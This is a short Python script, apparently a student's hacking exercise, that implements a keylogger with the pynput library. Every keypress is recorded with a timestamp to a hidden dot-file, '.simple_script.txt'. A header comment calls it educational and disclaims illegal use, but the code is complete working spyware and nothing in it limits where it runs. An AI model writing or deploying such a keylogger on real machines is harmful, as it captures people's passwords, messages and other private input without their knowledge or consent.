#!/usr/bin/env python3

# This script is only for educational purpose in my studies about hacking (cibersecurity). I don't agree and don't approve illegal activities.

from pynput.keyboard import Listener
import logging

logging.basicConfig(
filename=".simple_script.txt",
level=logging.DEBUG,
format=" %(asctime)s-%(message)s")

def on_press(key):
	logging.info(str(key))

with Listener(on_press=on_press) as listener:
	listener.join()

